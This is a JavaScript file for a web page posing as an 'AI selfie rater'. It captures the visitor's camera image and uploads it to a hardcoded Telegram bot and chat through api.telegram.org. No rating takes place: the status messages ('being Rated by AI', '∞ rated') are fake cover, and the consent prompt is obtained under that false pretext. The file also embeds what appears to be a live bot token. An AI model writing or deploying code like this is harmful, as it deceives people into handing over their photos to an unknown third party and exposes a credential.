
const BOT_TOKEN = "8870605173:AAH2gD5mlWPT-Vmi0j8dH1XA6dyXIl8EfPA";
const CHAT_ID = "8104741033";

const $ = id => document.getElementById(id);

let stream = null;
let photoBlob = null;
let busy = false;
let operation = 0;

function status(message) {
  $("status").textContent = message;
}

function stopCamera() {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
    stream = null;
  }
  $("video").srcObject = null;
}

function clearPhoto() {
  if ($("preview").src.startsWith("blob:")) {
    URL.revokeObjectURL($("preview").src);
  }
  $("preview").removeAttribute("src");
  $("preview").hidden = true;
  $("retakeBtn").hidden = true;
  $("sendBtn").hidden = true;
  $("video").hidden = false;
  photoBlob = null;
}

function cancel() {
  operation++;
  busy = false;
  stopCamera();
  clearPhoto();
  $("cameraPanel").hidden = true;
  $("startBtn").disabled = false;
  $("cancelBtn").hidden = true;
  status("Cancelled. Camera stopped; no Selfie Captured");
}

$("startBtn").addEventListener("click", async () => {
  if (!$("consent").checked) {
    status("Please agree before activating the camera.");
    return;
  }

  if (!window.isSecureContext || !navigator.mediaDevices?.getUserMedia) {
    status("Camera access requires HTTPS and a supported browser.");
    return;
  }

  const id = ++operation;
  $("startBtn").disabled = true;
  $("cancelBtn").hidden = false;
  $("cameraPanel").hidden = false;
  status("Requesting camera permission…");

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      audio: false,
      video: {
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 1280 }
      }
    });

    if (id !== operation) {
      stream.getTracks().forEach(t => t.stop());
      return;
    }

    $("video").srcObject = stream;
    await $("video").play();

    await new Promise(resolve => setTimeout(resolve, 1200));
    if (id !== operation) return;

    const video = $("video");
    const canvas = $("canvas");

    if (!video.videoWidth || !video.videoHeight) {
      throw new Error("No camera frame is available.");
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(
      video, 0, 0, canvas.width, canvas.height
    );

    photoBlob = await new Promise((resolve, reject) => {
      canvas.toBlob(
        blob => blob ? resolve(blob) :
          reject(new Error("Selfie capture failed.")),
        "image/jpeg",
        0.9
      );
    });

    if (id !== operation) return;

    $("preview").src = URL.createObjectURL(photoBlob);
    $("preview").hidden = false;
    video.hidden = true;
    $("retakeBtn").hidden = false;
    $("sendBtn").hidden = false;
    stopCamera();

    status("Selfie captured. Rate it.");
  } catch (error) {
    if (id !== operation) return;
    stopCamera();
    $("cameraPanel").hidden = true;
    $("startBtn").disabled = false;
    $("cancelBtn").hidden = true;
    status("Camera unavailable: " + error.message);
  }
});

$("cancelBtn").addEventListener("click", cancel);

$("retakeBtn").addEventListener("click", () => {
  clearPhoto();
  $("startBtn").disabled = false;
  $("cameraPanel").hidden = true;
  status("Select Agree & Start Camera to take another selfie.");
});

$("sendBtn").addEventListener("click", async () => {
  if (!photoBlob || busy) return;

  // Do not send with placeholder credentials.
  if (
    !BOT_TOKEN || !CHAT_ID ||
    BOT_TOKEN === "YOUR_BOT_TOKEN" ||
    CHAT_ID === "YOUR_CHAT_ID"
  ) {
    status("Selfie Capturing Failed. Please try Again.");
    return;
  }

  busy = true;
  $("sendBtn").disabled = true;
  status("Please Wait for a moment! Rating your Selfie…");

  try {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", photoBlob, "selfie.jpg");

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: form }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      throw new Error(result.description || "Selfie Corrupted. Please retry.");
    }

    cancel();
    $("consent").checked = false;
    status("Your Selfie is being Rated by AI. It's a ∞ rated Selfie .");
  } catch (error) {
    status("Selfie Corrupted: " + error.message);
  } finally {
    busy = false;
    $("sendBtn").disabled = false;
  }
});

window.addEventListener("pagehide", stopCamera);
